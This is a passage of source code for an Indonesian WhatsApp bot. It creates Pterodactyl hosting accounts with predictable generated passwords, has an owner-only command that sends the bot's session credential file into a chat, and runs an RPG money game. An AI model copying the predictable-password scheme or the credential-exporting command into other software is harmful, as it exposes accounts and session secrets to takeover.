ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`

let tekss8 = ctffffffff

let msghhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss8
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctffffffff})
}
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "8gb": {
if (!isPremium) return reply(`Khusus Orang Spesial`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "200"
let disk = "8000"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/a12558476b9aa179544a0.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctfffffffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Akun Panel Anda  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`

let tekss9 = ctfffffffff

let msghhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss9
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if  (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctfffffffff})
}
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
    
    case 'delsession':
            case 'clearsession': {
                if (!isCreator) return reply("?")
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Bentar..`
                    if (filteredArray.length == 0) return m.reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    
                    
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    m.reply("Sukses")
                });
            }
            break
        case 'getsession':
                if (!isCreator) return reply("?")
                
                let sesi = fs.readFileSync('./session/creds.json')
                ptz.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
    case 'listcase': {
const listCase = () => {
const code = fs.readFileSync("./message.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}
let teks = `*Total Case*: ${matches.length} \n\n` 
matches.forEach(function (x) {
   teks += "◦ " + x + "\n"
})
return teks
}
reply(listCase())
}
break
    case 'everyone': 
        if (!isAdmins) return
 ptz.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await ptz.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'everyone' 
}
]
}
}
)
   setTimeout(async () => {
           reply(`${pushname} memggunakan ${command} untuk memanggil kalian`)
            }, 1120)
        break    
       
        case "guwawor":
     ptz.sendMessage(m.chat, {text:"BOKEP BOKEP 😂"}, {quoted:fsaluran})  
        break
              case 'txt2img': case 'txtimg':{
if (!text) return reply ('Masukan prompt')
try {
let anu = await (await fetch(`https://widipe.com/ai/text2img?text=${text}`))
ptz.sendMessage(m.chat, {image: anu, caption: `Done`},{quoted:fsaluran})
     } catch (e) {
reply('Gagal Convert Gambar') 
}
}
break  

        // Rpg
      



        case "lamar-kerja":
        if (userdb.apajob == true) return m.reply("*_Lu udah kerja_*")
        
        if (!text ||  !['ojek', 'petani', 'pendagang', 'dokter', 'kurir', 'hauling', 'polisi'].includes(text.toLowerCase())) {
   let kerjaan = `⌕ Contoh Penggunaan: ${prefix}${command} kurir

*Berikut adalah daftar pekerjaan yang tersedia*

◦ ojek 
◦ petani 
◦ pendagang 
◦ dokter
◦ kurir 
◦ hauling
◦ polisi
`
reply(kerjaan)
}
      
let job = `${text}`
   
   setTimeout(() => {
  let lamarkerja1 = `Kamu telah memilih *${job}* sebagai pekerjaanmu
  
*_<⋄> Tunggulah persetujuan dari pihak perusahaan dalam 1 menit agar diterima untuk bekerja._*`

  reply(lamarkerja1)}, 0)

setTimeout(() => {
  let lamarkerja2 = `Selamat, lamaran kerja kamu telah diterima oleh pihak perusahaan dan sekarang kamu dapat memulai untuk bekerja hari ini.
  
*_<⋄> Ketik *.kerja* untuk melihat detail pekerjaan._*`

  m.reply(lamarkerja2)}, 30000)

setTimeout(() => {
    userdb.job = job
    userdb.apajob = true
}, 1000)          

if (job === "kurir") {
userdb.kurir = true
} else if (job === "ojek") {
userdb.ojek = true
} else if (job === "petani") {
userdb.farm = true
} else if (job === "pendagang") {
userdb.warung = true
} else if (job === "dokter") {
userdb.dokter = true
} else if (job === "hauling") {
userdb.hauling = true
} else if (job === "polisi") { 
userdb.polis = true
}
console.log("Sun")
        break
        
        case "out-kerja":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja dasar pengangguran_*")
        
        if (!text) return m.reply("Y : yes , Example: .out-kerja Y")
        if (text === "Y") {
        if (userdb.job === "kurir") {
userdb.kurir = false
userdb.job = "nganggur"
    userdb.apajob = false
} else if (userdb.job === "ojek") {
userdb.ojek = false
userdb.job = "nganggur"
    userdb.apajob = false
} else if (userdb.job === "petani") {
userdb.farm = false
userdb.job = "nganggur"
    userdb.apajob = false
} else if (userdb.job === "pendagang") {
userdb.warung = false
userdb.job = "nganggur"
    userdb.apajob = false
} else if (userdb.job === "dokter") {
userdb.dokter = false
userdb.job = "nganggur"
    userdb.apajob = false
} else if (userdb.job === "hauling") {
userdb.hauling = false
userdb.job = "nganggur"
    userdb.apajob = false
} else if (userdb.job === "polisi") { 
userdb.polis = false
userdb.job = "nganggur"
    userdb.apajob = false
}
        } else {
        m.reply("Ok")
        }
        
        case "pendagang":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.warung == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ PENDAGANG ] :`* Sedang Kerja")
        
        setTimeout(() => {
        m.reply("*`[ PENDAGANG ] :`* .....")
        }, 2500)
        
        setTimeout(() => {
        bs7 = randomNomor(70000)
        addMonay(m.sender, bs7)
        m.reply("*`[ PENDAGANG ] :`* Kamu membereskan daganggan dan storan ke bos..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7}`)
        }, 9500)
     
        
        break
        
        case "petani":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.farm == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ PETANI ] :`* Sedang Kerja")
        
        setTimeout(() => {
        m.reply("*`[ PETANI ] :`* .....")
        }, 2500)
        
        setTimeout(() => {
        bs7 = randomNomor(30000)
        addMonay(m.sender, bs7)
        m.reply("*`[ PETANI ] :`* Kamu pulang..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7}`)
        }, 9500)
     
        
        break
        
        case "dokter":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.dokter == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ DOKTER ] :`* Sedang Kerja")
        
        setTimeout(() => {
        m.reply("*`[ DOKTER ] :`* .....")
        }, 2500)
        
        setTimeout(() => {
        bs7 = randomNomor(60000)
        addMonay(m.sender, bs7)
        m.reply("*`[ DOKTER ] :`* Kamu pulang..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7}`)
        }, 9500)
     
        
        break
        
        case "ojek":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.ojek == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ OJEK ] :`* Sedang Kerja")
        
        setTimeout(() => {
        m.reply("*`[ OJEK ] :`* .....")
        }, 2500)
        
        setTimeout(() => {
        bs7 = randomNomor(10000)
        addMonay(m.sender, bs7)
        m.reply("*`[ OJEK ] :`* Kamu pulang..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7}`)
        }, 9500)
     
        
        break
        
        case "polisi":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.polis == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ POLISI ] :`* Sedang Kerja")
        
        setTimeout(() => {
        m.reply("*`[ POLISI ] :`* .....")
        }, 2500)
        
        setTimeout(() => {
        bs7 = randomNomor(1100000)
        addMonay(m.sender, bs7)
        m.reply("*`[ POLISI ] :`* Tugasmu Selesai..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7}`)
        }, 9500)
     
        
        break
        
        
        case "kurir":
        if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.kurir == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        async function kuriiiiii() {
        m.reply("*`[ KURIR ] :`* Jadi kurir paket yo..")
        setTimeout(() => {
        m.reply("*`[ KURIR ] :`* Kamu mengantarkan beberapa paket..")
        }, 5500)
        
        setTimeout(() => {
        m.reply("*`[ KURIR ] :`* ..")
        }, 2500)
        
        setTimeout(() => {
        bs7 = randomNomor(20000)
        addMonay(m.sender, bs7)
        m.reply("*`[ KURIR ] :`* Kamu sampai, kamu mengantar ke Costumer..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7}`)
        }, 4500)
        }
        return kuriiiiii()
        
        break
        
         case "hauling":
          if (userdb.apajob == false) return m.reply("*_Lu Ga kerja .lamar-kerja untuk kerja_*")
        if (userdb.hauling == false) return m.reply("*_Bukan perkerjaan untuk Kamu_*")
        
        m.reply("*`[ HAULING ] :`* Hauling yo..")
        setTimeout(() => {
        m.reply("*`[ HAULING ] :`* Kamu mengantarkan minyak..")
        }, 5500)
        
        setTimeout(() => {
        m.reply("*`[ HAULING ] :`* ..")
        }, 2500)
        
        setTimeout(() => {
        bs7 = randomNomor(700000)
        addMonay(m.sender, bs7)
        m.reply("*`[ HAULING ] :`* Kamu sampai, kamu mengantar ke Tuan Buas Rei..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7}`)
        }, 4500)
        break
        
        
        case "mulung":
        m.reply("*`[ MULUNG ] :`* Mulung yo..")
        setTimeout(() => {
        m.reply("*`[ MULUNG ] :`* Dapat beberapa kaleng & botol..")
        }, 4500)
        
        setTimeout(() => {
        m.reply("*`[ MULUNG ] :`* Dapat beberapa kaleng & botol..")
        }, 1500)
        
        setTimeout(() => {
        bs7 = randomNomor(10000)
        
        addMonay(m.sender, bs7)
        m.reply("*`[ MULUNG ] :`* Kamu menjualnya ke Tuan Buas Rei..\n\n" + `Kamu mendapatkan uang sejumlah ${bs7}`)
        }, 4500)
        
        break
        
        case "musuh":
        async function uskwkisjwi23() {                   
        const gggha = await pickRandom(["Musuh","Aman","gede"])
        if (gggha === "gede") {
        userdb.DarahOrang -= 41
        userdb.recoverplug += 4
        userdb.tp += 7
        m.reply("Kamu Menyerang digimon liar, kamu kekurangan darah.\n\nAdd 52xp Minus 41 Hp, Training point, recover")
        addXP(m.sender, 42)
        } else if (gggha === "Aman") {
         userdb.DarahOrang -= 33
         userdb.tp += 4
         userdb.recoverplug += 3
        m.reply("Kamu Menyerang digimon liar, kamu kekurangan darah.\n\nAdd 39xp Minus 33 Hp, Training point, recover")
        addXP(m.sender, 32)
        } else if (gggha === "Musuh") {
        userdb.tp += 1
        userdb.DarahOrang -= 28
        userdb.recoverplug += 1
        m.reply("Kamu Menyerang digimon liar, kamu kekurangan darah.\n\nAdd 32xp Minus 29 Hp, Training point, recover")
        addXP(m.sender, 32)
        }
        }
        
         uskwkisjwi23()      
         setTimeout(async () => {
         uskwkisjwi23()
         }, 4500)
        break 
        
        case "cari-rpg":
        if (!text) return m.reply("*`otomatis di cari`*\n musuh / makanan, Go - No\n\n.cari-rpg Go")    
        if (userdb.memcari === true) return m.reply("`[ Kamu sedang di mode mencari ]`")
        userdb.memcari = true
        async function uskwkisjwi2() {                   
        const gggha = await pickRandom(["Musuh","Aman"])
        if (gggha === "Musuh") {
        userdb.DarahOrang -= 28
        userdb.recoverplug += 3
        userdb.tp += 1
        m.reply("Kamu Menyerang digimon liar, kamu kekurangan darah.\n\nAdd 32xp Minus 26 Hp, Training point, recover")
        addXP(m.sender, 32)
        } else if (gggha === "Aman") {
        userdb.digim = 4
        userdb.recoverplug += 1
        m.reply("Kamu memdapatkan makanan, recover untuk digimon mu..")
        }
        }
        
        uskwkisjwi2()
        setTimeout(() => {
        uskwkisjwi2()
        }, 3200)
        setTimeout(() => {
        uskwkisjwi2()
        }, 4200)
        
        setTimeout(() => {
        uskwkisjwi2()
        }, 7200)
        
        break
        
  case "setname": case "setname-rpg":
   if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
  if (!text) return m.reply("Masukan Nama Baru: .setname Axios")
  userdb.setname = `${text}`
  reply("_*Succes Change Name*_")
     break   
case 'inv': case 'inventori': case 'inventory': case 'profile': case 'my':{
                     if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
if (!isDarah){ addInventoriDarah(m?.sender, DarahAwal) }
if (!isenergy){ addInventorienergy(m?.sender, 270) }     
if (!isInventory){ addInventori(m?.sender) }
if (!isInventoriBuruan){ addInventoriBuruan(m?.sender) }
let h = "`"


const sidigib = await sidigi()

let teksehmazeh = `▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*${h}< PROFILE USER >${h}*

─ Name: ${userdb.setname}
─ Limit: Unlimited
─ Hit Cmd: ${userdb.hitcmd}
─ Kerjaan: ${userdb.job}
─ Digimon: ${sidigib}
─ Bits: ${userdb.bits}

*${h}< STATS - DIGIMON >${h}*

─ Training Point: ${userdb.tp}
─ Recover Plug: ${userdb.recoverplug}
─ Healt Point: ${getDarah(m?.sender)} 
─ Kenyang: ${userdb.kenyang}
─ Senang: ${userdb.happy}
─ Attack: ${userdb.attackdigi}

*${h}< STATS - RPG >${h}*\n\n`
teksehmazeh += `*─ Darah kamu:* ${userdb.DarahOrang}\n`
teksehmazeh += `*─ Energy kamu:* ${getenergy(m?.sender)}\n`
teksehmazeh += `*─ Potion Kamu:* ${getPotion(m?.sender)}\n\n`
teksehmazeh += `*${h}[ HASIL  - MINING ]${h}*\n\n`
teksehmazeh += `*─ Besi:* ${getBesi(m?.sender)}\n`
teksehmazeh += `*─ Emas:* ${getEmas(m?.sender)}\n`
teksehmazeh += `*─ Emerald:* ${getEmerald(m?.sender)}\n\n`
teksehmazeh += `*${h}[ HASIL -  BURUAN ]${h}*\n\n`
teksehmazeh += `*─ Ikan:* ${getIkan(m?.sender)}\n`
teksehmazeh += `*─ Ayam:* ${getAyam(m?.sender)}\n`
teksehmazeh += `*─ Kelinci:* ${getKelinci(m?.sender)}\n`
teksehmazeh += `*─ Domba:* ${getDomba(m?.sender)}\n`
teksehmazeh += `*─ Sapi:* ${getSapi(m?.sender)}\n`
teksehmazeh += `*─ Gajah:* ${getGajah(m?.sender)}\n\n`
teksehmazeh += `*${h}[ COLLECTION - POWER ]${h}*\n\n`
teksehmazeh += `*[ Rare ] 👑 Mahkota Tuan Buas:* ${getMahkota(m?.sender)}\n`
teksehmazeh += `*[ Rare ] 🥤 Rei Cho-Cho:* ${getCho(m?.sender)}\n\n`
teksehmazeh += `*${h}[ Rendeem Token ]${h}*\n`
teksehmazeh += `*─ Spin Token:* ${gettoken(m?.sender)}\n\n▬▭▬▭▬▭▬▭▬▭▬`

reply(teksehmazeh)
}
break
        case 'power-mahkota':{
                             if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
  const isMahkota = getMahkota(m?.sender)          
 if (isMahkota < 3) return reply(`Kamu Tidak Punya 3 Mahkota Tuan buas`) 
 addDarahOrang(m?.sender, 2300)
 KurangMahkota(m?.sender, 3)
 reply('*`[ Blood power ]`* - King of many bloods\n*=> Darahmu Bertambah Jadi 1000+*')
            setTimeout(async () => {
                reply('<!> Power Aktif,Mahkota Telah hilang')
                }, 1000)
 }
 break
        case 'power-energy':{
                             if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
  const isMahkotaa = getCho(m?.sender)          
 if (isMahkotaa < 2) return reply(`Kamu Tidak Punya 2 Cho - Cho Power`) 
 addenergy(m?.sender, 3800)
 kurangCho(m?.sender, 2)
 reply('*`[ Stamina power ]`* - Unlimate Rpg\n*=> Energy Bertambah Jadi 2000+*')
            setTimeout(async () => {
                reply('<!> Power Aktif,Cho-cho Power Telah Di minum')
                }, 1000)
 }
 break
         case 'beli': case 'buy':{
                              if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!isInventoriBuruan){ addInventoriBuruan(m?.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m?.sender) }
 if (!isInventory){ addInventori(m?.sender) }
 if (!text) return reply(`Apa yg ingin kamu beli?\n\n1.potion\n2.baitfood\n3.token\nContoh: ${prefix + command} baitfood`)
 var anuu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anuu
 if (!args[1]) return reply(`Contoh : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m?.sender, noh)
 var apalu = anuu * 1
 addPotion(m?.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil\n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Potion Mu:* ${getPotion(m?.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anuu
 if (!args[1]) return reply(`Contoh : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m?.sender, noh)
 var apalu = anuu * 1
 addUmpan(m?.sender, apalu)
setTimeout( () => {
reply(`Transaksi Berhasil\n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Bait Food Mu:* ${getUmpan(m?.sender)}`)
}, 2000) 
} else 
if (args[0] === 'token'){
let noh = 35000 * anuu
 if (!args[1]) return reply(`Contoh : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return reply('Uang mu tidak mencukupi')
 kurangMonay(m?.sender, noh)
 var apalu = anuu * 3
 addtoken(m.sender, apalu)       
setTimeout( () => {
reply(`Transaksi Berhasil\n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Your Limit* : ${getLimit(m?.sender)}`)
}, 2000) 
}
 }
 break
        case 'heal':{
                             if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!isCekDarah < 1) return reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
 if (isCekDarah > 100) return reply('Darahmu Masih Full')
 if (isPotion < 1) return reply(`Kamu Tidak Punya Potion, Belilah dengan cara .buypotion <jumlah>`) 
 addDarahOrang(m?.sender, 100)
 kurangPotion(m?.sender, 1)
 reply('Success! Darahmu Full Kembali')
 }
 break
        
               case 'sell': case 'jual':{
                   if (!isUserRegistered(ckusrjoin)) return reply('*`[ Kamu Belum Memulai Rpg ]`*\n\nUntuk memulai rpg game ketik .joinrpg dan untuk keluar game ketik .exitrpg');
 if (!q) reply(`What Do You Want To Sell??\nContoh : ${prefix + command} fish 2`)
 if (!isInventoriBuruan){ addInventoriBuruan(m?.sender) } 
 if (!isInventoryMonay){ addInventoriMonay(m?.sender) }
 if (!isInventory){ addInventori(m?.sender) }
 var anuv = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anuv) return reply(`Kamu Tidak Memiliki Cukup Ikan Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m?.sender, anuv)
 let monaynya = 1500 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Ikan Mu:* ${getIkan(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anuv) return reply(`Kamu Tidak Memiliki Cukup Ayam Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m?.sender, anuv)
 let monaynya = 2500 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Ayam Mu:* ${getAyam(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anuv) return reply(`Kamu Tidak Memiliki Cukup Kelinci Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m?.sender, anuv)
 let monaynya = 3000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Kelinci Mu:* ${getKelinci(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anuv) return reply(`Kamu Tidak Memiliki Cukup Domba Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m?.sender, anuv)
 let monaynya = 5000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Domba Mu:* ${getDomba(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anuv) return reply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m?.sender, anuv)
 let monaynya = 10000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Sapi Mu:* ${getSapi(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anuv) return reply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m?.sender, anuv)
 let monaynya = 15000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Gajahmu:* ${getGajah(m?.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anuv) return reply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m?.sender, anuv)
 let monaynya = 16000 * anuv
 addMonay(m?.sender, monaynya)
setTimeout( () => {
reply(`Transaksi Berhasil \n*Sisa uangmu* : ${getMonay(m?.sender)}\n*Sisa Besi Mu:* ${getBesi(m?.sender)}`)
